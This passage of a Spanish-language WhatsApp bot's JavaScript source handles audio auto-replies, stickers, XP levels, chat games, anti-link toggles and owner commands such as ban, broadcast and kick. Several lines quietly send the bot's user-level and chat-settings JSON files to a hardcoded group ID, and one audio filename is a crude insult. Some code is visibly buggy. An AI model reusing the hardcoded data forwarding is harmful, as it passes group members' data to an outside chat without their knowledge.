            if (budy === 'RANDOM' || budy === 'bot' || budy === 'Bot') {
                result = fs.readFileSync(`./XeonMedia/audio/random/${xeonyaudio3[Math.floor(Math.random() * xeonyaudio3.length)]}.mp3`)
                SkyzeeBOT.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
            }
            if (budy === 'c ríe*' && m.quoted) {
                result = fs.readFileSync(`./XeonMedia/audio/se ríe.mp3`)
                SkyzeeBOT.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: quoted.sender })
            }
            if (budy === '?') {
                result = fs.readFileSync(`./XeonMedia/audio/interrogación.mp3`)
                SkyzeeBOT.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
            }
            if (budy === 'la fiesta del admin') {
                result = fs.readFileSync(`./XeonMedia/audio/la fiesta del admin.mp3`)
                SkyzeeBOT.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true, mentions: participants.map(a => a.id)}, { quoted: m })                    
            }
            if (budy.startsWith([':v', ":'v", ':"v'])) {
                result = fs.readFileSync(`./XeonMedia/audio/pacman.mp3`)
                SkyzeeBOT.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
            }
            for (let anjh of xeonyimage){
				if (budy === anjh){
					result = fs.readFileSync(`./XeonMedia/image/${anjh}.jpg`)
					SkyzeeBOT.sendMessage(m.chat, { image: result }, { quoted: m })
				}
			}
            for (let anjh of xeonyvideo){
				if (budy === anjh){
					result = fs.readFileSync(`./XeonMedia/video/${anjh}.mp4`)
					SkyzeeBOT.sendMessage(m.chat, { video: result }, { quoted: m })
				}
			}
        }
        if (isautosticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await SkyzeeBOT.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await SkyzeeBOT.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
       	global.groupsmeme = SkyzeeBOT.groupFetchAllParticipating()
    //══════════[ !AUTO ]══════════//

//emoji 
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI();
emoji.get(satu)
.then(emoji => {
const buttons = [{buttonId: "y", buttonText: {displayText:satu}, type: 1}]
const buttonMessage = {image: {url: emoji.images[dua].url},caption: "Here you go!",footerText: `${botname}`,buttons: buttons,headerType: 4}
SkyzeeBOT.sendMessage(from, buttonMessage, {quoted:m})
})
} catch (e) {
m.reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: SkyzeeBOT.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, SkyzeeBOT.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
SkyzeeBOT.ev.emit('messages.upsert', msg)
}

        //══════════[ LEVELING XP ]══════════//
        const getRole = (lr) => {
        let role = 'ɪ 𝘾𝘼𝙌𝙐𝙄𝙏𝘼 ɪ'
            if (lr <= 3) {
                role = 'ɪɪ 𝙋𝙍𝙄𝙈𝙀𝙍𝙊𝙎 𝙋𝘼𝙎𝙊𝙎 ɪɪ'
            } else if (lr <= 5) {
                role = 'ɪɪɪ 𝘾𝙐𝙈 ɪɪɪ'
            } else if (lr <= 7) {
                role = 'ɪᴠ 𝘼𝘾𝙏𝙄𝙑𝙊 ɪᴠ'
            } else if (lr <= 10) {
                role = 'ᴠ 𝙎𝙐𝙋𝙀𝙍 𝘼𝘾𝙏𝙄𝙑𝙊 ᴠ'
            } else if (lr <= 12) {
                role = 'ᴠɪ 𝙁𝙍𝙄𝙆𝙄 ᴠɪ'
            } else if (lr <= 15) {
                role = 'ᴠɪɪ 𝙀𝙎𝙋𝘼𝘾𝙄𝘼𝙇 ᴠɪɪ'
            } else if (lr <= 18) {
                role = 'ᴠɪɪɪ 𝙀𝙎𝙏𝙍𝙀𝙇𝙇𝘼 ᴠɪɪɪ'
            } else if (lr <= 20) {
                role = 'ɪx 𝙄𝙉𝙏𝙀𝙍𝙀𝙎𝙏𝙀𝙇𝘼𝙍 ɪx'
            } else if (lr <= 22) {
                role = 'x 𝙄𝙉𝙈𝙊𝙍𝙏𝘼𝙇 x'
            } else if (lr <= 25) {
                role = 'ＧＩＧＡＣＨＡＤ'
            }
            return role
        }
        const levelRole = getLevelingLevel(m.sender)
        const checkId = getLevelingId(m.sender)
        const roleUser = getRole(levelRole)
        const amountXp = Math.floor(Math.random() * 10) + 100
        const requiredXp = 5000 * (Math.pow(2, levelRole) - 1)
        if (isxplevel && m.isGroup && groupMetadata.participants.length > 20) {
            try {
                if (levelRole === undefined && checkId === undefined) addLevelingId(m.sender)
                getLevelingLevel(m.sender)
                addLevelingXp(m.sender, amountXp)
                if (requiredXp <= getLevelingXp(m.sender)) {
                    addLevelingLevel(m.sender, 1)   
                    lvlup = (`══════ ⋆★ LEVEL UP!! ★⋆ ══════\n\n_¡Felicidades *${pushname}*!_\n_Haz alcanzado el nivel *${getLevelingLevel(m.sender) - 1} (${role})*!!_\n\n══════ ⋆★ LEVEL UP!! ★⋆ ══════`)
                    SkyzeeBOT.sendText(from, lvlup, m)
                    SkyzeeBOT.sendText('5492996557871-1596940074@g.us', fs.readFileSync('./lib/rpg/leveluser.json'))
                }
            } catch (err) {
                console.error(err)
            }
        }
        //══════════[ !LEVELING XP ]══════════//

//guess song
        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await SkyzeeBOT.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess The Song' }, type: 1 }], `🎮 Guess The Music 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, SkyzeeBOT.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Wrong answer!*')
        }
        
        //TicTacToe\\
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    //reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { 
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    reply({
	    '-3': 'Game Has Ended',
	    '-2': 'Invalid',
	    '-1': 'Invalid Position',
	    0: 'Invalid Position',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game Over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await SkyzeeBOT.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await SkyzeeBOT.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    SkyzeeBOT.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    SkyzeeBOT.sendText(m.chat, `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) SkyzeeBOT.sendText(roof.p, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) SkyzeeBOT.sendText(roof.p2, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) SkyzeeBOT.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    SkyzeeBOT.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih2) SkyzeeBOT.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih) SkyzeeBOT.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    SkyzeeBOT.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`
Don't tag him!
He's in AFK ${reason ? 'with reason ' + reason : 'no reason'}
During ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.data.users[m.sender] && db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            m.reply(`
You stop AFK${user.afkReason ? ' after ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
        
        //menu image randomizer
	let picaks = [flaming,fluming,flarun,flasmurf]
	let picak = picaks[Math.floor(Math.random() * picaks.length)]
	
	//menu doc randomizer
let documents = [doc1,doc2,doc3,doc4,doc5,doc6]
let docs = pickRandom(documents)

// Public & Self
        if (db.data.chats[m.chat].mute && !isPremium) return
        if (!public && !isCreator) return

async function antiLink (option, functionChat) {
            if (option === "on") {
                if (functionChat == "antiwagc" && !isantiwagc && m.isGroup) antiwagc.push(from)
                else if (functionChat == "antiwapc" && !isantiwapc && m.isGroup) antiwapc.push(from)
                else if (functionChat == "antiyt" && !isantiyt && m.isGroup) antiyt.push(from)
                else if (functionChat == "antiig" && !isantiig && m.isGroup) antiig.push(from)
                else if (functionChat == "antifb" && !isantifb && m.isGroup) antifb.push(from)
                else if (functionChat == "antitg" && !isantitf && m.isGroup) antitg.push(from)
                else if (functionChat == "antitt" && !isantitt && m.isGroup) antitt.push(from)
                else if (functionChat == "antitwt" && !isantitwt && m.isGroup) antitwt.push(from)
                else if (functionChat == "antidocs" && !isantidocs && m.isGroup) antidocs.push(from)
                else if (functionChat == "antitoxic" && !isantitoxic && m.isGroup) antitoxic.push(from)
                else if (functionChat == "antiflood" && !isantiflood && m.isGroup) antiflood.push(from)
                else if (functionChat == "antilinks" && !isantilinks && m.isGroup) antilinks.push(from)
                else if (functionChat == "autoreply" && !isautoreply && m.isGroup) autoreply.push(from)
                else if (functionChat == "autosticker" && !isautosticker) autosticker.push(from)
                else if (functionChat == "xplevel" && !isxplevel && m.isGroup) xplevel.push(from)
                else if (functionChat == "nsfw" && !isnsfw) nsfw.push(from)
                else if (functionChat == "notbuttons" && !notButtons) notbuttons.push(from)
                else return replyNone(`Función ${functionChat} ya está activada!`)
                others = ['autoreply', 'autosticker', 'xplevel', 'notbuttons']
                buttonsNsfw = [
                    { buttonId: `${prefix}nsfwmenu`, buttonText: { displayText: '＃ 𝐂𝐌𝐃 𝐍𝐒𝐅𝐖' }, type: 1 },
                ]
                if (functionChat === 'nsfw' && !notButtons) SkyzeeBOT.sendMessage(m.chat, {text: `*FUNCIÓN ${functionChat} ACTIVADA*`, buttons: buttonsNsfw, headerType: 4}, {quoted: m})
                if (functionChat === 'nsfw' && notButtons) SkyzeeBOT.sendText(m.chat, `*FUNCIÓN ${functionChat} ACTIVADA*\n\n${prefix}nsfwmenu para ver los comandos`, m)
                for (let i of others) {
                    if (functionChat !== i) replySuccess(`*FUNCIÓN ${functionChat} ACTIVADA*\n\nSugerimos notificar a todos (con comandos de mención) sobre esta nueva regla en el grupo para que puedan informarse.`)
                    else if (functionChat === i) replySuccess(`*FUNCIÓN ${functionChat} ACTIVADA*`)
                }
            	// fs.writeFileSync('./database/chatsettings.json', chatsSettings)
                SkyzeeBOT.sendText('5492996557871-1596940074@g.us', fs.readFileSync('./database/chatsettings.json'))
            } else if (option === "off") {
                if (functionChat == "antiwagc" && isantiwagc) {off = antiwagc.indexOf(from); antiwagc.splice(off, 1)}
                else if (functionChat == "antiwapc" && isantiwapc) {off = antiwapc.indexOf(from); antiwapc.splice(off, 1)}
                else if (functionChat == "antiyt" && isantiyt) {off = antiyt.indexOf(from); antiyt.splice(off, 1)}
                else if (functionChat == "antiig" && isantiig) {off = antiig.indexOf(from); antiig.splice(off, 1)}
                else if (functionChat == "antifb" && isantifb) {off = antifb.indexOf(from); antifb.splice(off, 1)}
                else if (functionChat == "antitg" && isantitf) {off = antitg.indexOf(from); antitg.splice(off, 1)}
                else if (functionChat == "antitt" && isantitt) {off = antitt.indexOf(from); antitt.splice(off, 1)}
                else if (functionChat == "antitwt" && isantitwt) {off = antitwt.indexOf(from); antitwt.splice(off, 1)}
                else if (functionChat == "antidocs" && isantidocs) {off = antidocs.indexOf(from); antidocs.splice(off, 1)}
                else if (functionChat == "antitoxic" && isantitoxic) {off = antitoxic.indexOf(from); antitoxic.splice(off, 1)}
                else if (functionChat == "antiflood" && isantiflood) {off = antiflood.indexOf(from); antiflood.splice(off, 1)}
                else if (functionChat == "antilinks" && isantilinks) {off = antilinks.indexOf(from); antilinks.splice(off, 1)}
                else if (functionChat == "autoreply" && isautoreply) {off = autoreply.indexOf(from); autoreply.splice(off, 1)}
                else if (functionChat == "autosticker" && isautosticker) {off = autosticker.indexOf(from); autosticker.splice(off, 1)}
                else if (functionChat == "xplevel" && isxplevel) {off = xplevel.indexOf(from); xplevel.splice(off, 1)}
                else if (functionChat == "nsfw" && isnsfw) {off = nsfw.indexOf(from); nsfw.splice(off, 1)}
                else if (functionChat == "notbuttons" && notButtons) {off = notbuttons.indexOf(from); notbuttons.splice(off, 1)}
                else return replyNone(`Función ${functionChat} ya está desactivada!`)
                replySuccess(`FUNCIÓN ${functionChat} DESACTIVADA`)
                SkyzeeBOT.sendText('5492996557871-1596940074@g.us', fs.readFileSync('./database/chatsettings.json'))
            } else {
                let buttons = [
                    { buttonId: `${prefix + functionChat} on`, buttonText: { displayText: 'On' }, type: 1 },
                    { buttonId: `${prefix + functionChat} off`, buttonText: { displayText: 'Off' }, type: 1 }
                ]
                if (!notButtons) await SkyzeeBOT.sendButtonText(m.chat, buttons, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
                if (notButtons) await SkyzeeBOT.sendText(m.chat, `Please choose a option\n\n${buttons[0].buttonId}\n${buttons[1].buttonId}`, m, {footer: `${global.botname}`})
            }
        }

function nacionalityNumber (number) {
	let nacionality = '?'
	if (/^54*/.test(number)) nacionality = 'Argentina'
		else if (/^56*/.test(number)) nacionality = 'Chile'
		else if (/^598*/.test(number)) nacionality = 'Uruguay'
		else if (/^55*/.test(number)) nacionality = 'Brasil'
		else if (/^57*/.test(number)) nacionality = 'Colombia'
		else if (/^51*/.test(number)) nacionality = 'Perú'
		else if (/^593*/.test(number)) nacionality = 'Ecuador'
		else if (/^58*/.test(number)) nacionality = 'Venezuela'
		else if (/^591*/.test(number)) nacionality = 'Bolivia'
		else if (/^595*/.test(number)) nacionality = 'Paraguay'
		else if (/^52*/.test(number)) nacionality = 'Mexico'
		else if (/^502*/.test(number)) nacionality = 'Guatemala'
		else if (/^53*/.test(number)) nacionality = 'Cuba'
		else if (/^503*/.test(number)) nacionality = 'El Salvador'
		else if (/^506*/.test(number)) nacionality = 'Costa Rica'
		else if (/^507*/.test(number)) nacionality = 'Panamá'
		else if (/^504*/.test(number)) nacionality = 'Honduras'
		else if (/^505*/.test(number)) nacionality = 'Nicaragua'
		else if (/^34*/.test(number)) nacionality = 'España'
	return nacionality
}


	const requireAdmin = () => { if (!isBotAdmins) throw replyWarn(mess.botNotAdmin) }
	const onlyAdmin = () => { if (!isAdmins && !isCreator) throw replyWarn(mess.notAdmin) }
	const onlyRoot = () => { if (!isPremium && !isCreator) throw replyWarn(mess.owner) }
	const onlyGroup = () => { if (!m.isGroup) throw replyWarn(mess.group) }
	const noQ = (teks) => { if (!q) throw replyErr(teks) }
	const generateButton = (buttonId, displayText) => { return { buttonId: buttonId, buttonText: { displayText: displayText }, type: 1 } }

//swtich case
switch(command) {

// root cmd
            case 'ban': onlyRoot(); {
            	let usuario
            	if (m.mentionedJid[0]) usuario = m.mentionedJid[0]
            		else if (q) usuario = q
				if (usuario.endsWith('@c.us')) {
	            	if (bannedGroup.includes(usuario)) return replyNone('Este chat ya está baneado!')
	                bannedGroup.push(usuario)
	                replySuccess('Chat baneado.')
	            } else if (usuario.endsWith('@s.whatsapp.net')) {
	                if (bannedUser.includes(usuario)) return replyNone('Este usuario ya está baneado!')
	                bannedUser.push(usuario)
	                replySuccess('Usuario baneado. Ya no podrá usar el bot a partir de ahora 😎')
	            } else replyErr(`No se reconoció el ID *${q}*`)
            } break

            case 'unban': onlyRoot(); {
				let usuario
            	if (m.mentionedJid[0]) usuario = m.mentionedJid[0]
            		else if (q) usuario = q
				if (usuario.endsWith('@c.us')) {
	            	if (!bannedGroup.includes(usuario)) return replyNone('Este chat ya está baneado!')
                    bannedGroup.splice(bannedGroup.indexOf(q), 1)
	                replySuccess('Chat desbaneado.')
	            } else if (usuario.endsWith('@s.whatsapp.net')) {
	                if (!bannedUser.includes(usuario)) return replyNone('Este usuario ya está baneado!')
                	bannedUser.splice(bannedUser.indexOf(q), 1)
	                replySuccess('Usuario desbaneado')
	            } else replyErr(`No se reconoció el ID *${q}*`)
            } break

            case 'join': {
            	let result
            	if (m.quoted) result = m.quoted.text.split('https://chat.whatsapp.com/')[1]
                else if (!isUrl(q) && !q.includes('whatsapp.com')) return replyErr(`Invalid Link!`)
                replyNone(mess.wait)
                result = args[0].split('https://chat.whatsapp.com/')[1]
                await SkyzeeBOT.groupAcceptInvite(result)
            } break

            case 'leavegc': case 'leavegroup': onlyRoot(); {
                exit = args[0] ? args[0] : m.chat
                replyNone(mess.wait)
                await SkyzeeBOT.groupLeave(exit)
            } break

            case 'setexif': onlyRoot(); noQ('No se especificó el nombre del paquete y el autor del sticker'); {
				global.packname = q.split("|")[0]
				global.author = q.split("|")[1]
				replySuccess(`Exif Has Been Successfully Changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`)
            } break

		    case 'block': case 'unblock': onlyRoot(); {
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q ? q.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : undefined
				if (users === undefined) return replyErr("No se mencionó un usuario.")
				if (command === 'block') await SkyzeeBOT.updateBlockStatus(users, 'block')
				else if (command === 'unblock') await SkyzeeBOT.updateBlockStatus(users, 'unblock')
			} break

			case 'setbotimg': onlyRoot(); {
                if (!/image/.test(mime) && !/webp/.test(mime)) return replyErr(`No se adjuntó una imagen`)
                let media = await quoted.download()
                await SkyzeeBOT.updateProfilePicture(botNumber, media)
                replySuccess(mess.success)
			} break

			case 'msgbot': onlyRoot(); {
		        pchat = q.split('|')[0]
		        pq = q.split('|')[1]
		        sleep(1500)
				await SkyzeeBOT.sendMessage(pchat, { text : pq})
		    } break

case 'listpc': onlyRoot(); {
	let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v)
	let teks = `「 Personal Chat List 」\n\nHay ${anu.length} usuarios usando al ${botname}.`
	for (let i of anu) teks += `\n\nProfile : @${i.id.split('@')[0]}\nChat : ${i.unreadCount}\nLastchat : ${moment(i.conversationTimestamp * 1000).tz("America/Argentina/Buenos_Aires").format("DD/MM/YYYY HH:mm:ss")}`
	SkyzeeBOT.sendTextWithMentions(m.chat, teks, m)
} break

case 'listgc': onlyRoot(); {
	let getGroups = await SkyzeeBOT.groupFetchAllParticipating()
	let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
	let anu = groups.map(v => v.id)
	let teks = `「 Group Chat 」\n\n${botname} está en ${anu.length} grupos`
	for (let i of anu) {
		let metadata = await SkyzeeBOT.groupMetadata(i)
		if (metadata.owner === "undefined") loldd = false
			else loldd = metadata.owner
	 	teks += `\n\nName : ${metadata.subject ? metadata.subject : "undefined"}\nOwner : ${loldd ? '@' + loldd.split("@")[0] : "undefined"}\nID : ${metadata.id ? metadata.id : "undefined"}\nMade : ${metadata.creation ? moment(metadata.creation * 1000).tz('America/Argentina/Buenos_Aires').format('DD/MM/YYYY HH:mm:ss') : "undefined"}\nMember : ${metadata.participants.length ? metadata.participants.length : "undefined"}`
	}
	await SkyzeeBOT.sendTextWithMentions(m.chat, teks, m)
} break

            case 'statusbot': onlyRoot(); {
            	if (q === 'on') global.public = true
            	if (q === 'off') global.public = false
                replySuccess(`Successful Change To ${global.public}`)
            } break

case 'setbio': onlyRoot(); noQ('no text'); {
    SkyzeeBOT.setStatus(`${q}`)
    replySuccess(mess.success)
} break

            case 'ping': onlyRoot(); {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                	}
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                reply(respon)
            } break

            case 'speedtest': onlyRoot(); {
	            replyNone('Testing Speed...')
	            let cp = require('child_process')
	            let { promisify } = require('util')
	            let exec = promisify(cp.exec).bind(cp)
				let o
				try { o = await exec('python speed.py') }
				catch (e) { o = e } finally {
			        let { stdout, stderr } = o
			        if (stdout.trim()) reply(stdout)
			        if (stderr.trim()) reply(stderr)
	            }
            } break

			case 'broadcast': onlyRoot(); noQ('Se necesitan parámetros.'); {
				// PARA HACER: responder a un estado con el nombre "broadcast"
				var addButtons
				var media
				if (args[0] === 'gc') {
					let getGroups = await SkyzeeBOT.groupFetchAllParticipating()
					let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
					var anu = groups.map(v => v.id)
					replyNone(`Enviando difusión a ${anu.length} grupos. (1,5 segundos por chat)`)
				} else if (args[0] === 'pc') {
					var anu = store.chats.all().map(v => v.id)
					replyNone(`Enviando difusión a ${anu.length} personas. (1,5 segundos por chat)`)
				} else return replyErr('No se especificó el tipo de difusión.')
				if (args[1] && args[1].startsWith('--buttons:')) {
					let content = q.split('{', '}')
					if (content.includes('||')) {
						let buttons = content.split('||')
						addButtons = []
						for (let i of buttons.length) {
							let button = buttons[i]
							addButtons.push(generateButton(button))
						}
					} else addButtons.push(generateButton(content))
				}
				let teks = q.includes('text:') ? q.split('text:')[1] : undefined
				if (/image/.test(mime) || /video/.test(mime) || /webp/.test(mime) || /audio/.test(mime)) media = await quoted.download()
				for (let i of anu) {
					await sleep(1500)
					if (/webp/.test(mime)) SkyzeeBOT.sendMessage(i, { sticker: media })
					else if (/image/.test(mime)) SkyzeeBOT.send5ButImg(i, teks, botname, media, addButtons ? addButtons : null, thum)
					else if (/video/.test(mime)) SkyzeeBOT.sendMessage(i, { video: media, caption: teks })
					else if (/audio/.test(mime)) SkyzeeBOT.sendMessage(i, { audio: media, mimetype: 'audio/mpeg' })
				}
				if (args[0] === 'gc') replySuccess(`Difusión enviada a ${anu.length} grupos correctamente`)
				if (args[0] === 'pc') replySuccess(`Difusión enviada a ${anu.length} personas correctamente`)
			} break

// admingroup cmd
			case 'resetlink': onlyGroup(); onlyAdmin(); requireAdmin(); {
				SkyzeeBOT.groupRevokeInvite(m.chat) } break

			case 'kick': case 'add': case 'promote': case 'demote': onlyGroup(); requireAdmin(); onlyAdmin(); {
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q ? q.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : undefined
				if (users === undefined) return replyWarn("No se mencionó un usuario.")
				if (command === 'kick') {
					if (users === '5492996557871@s.whatsapp.net') return sendImageAsSticker(from, './XeonMedia/sticker/21hgh8.webp', m, { packname: `???`, author: `???`, })
			        let audio = [fs.readFileSync('./XeonMedia/audio/baneado.mp3'), fs.readFileSync('./XeonMedia/audio/a tu casa gorda puta.mp3')]
					await SkyzeeBOT.groupParticipantsUpdate(m.chat, [users], 'remove')
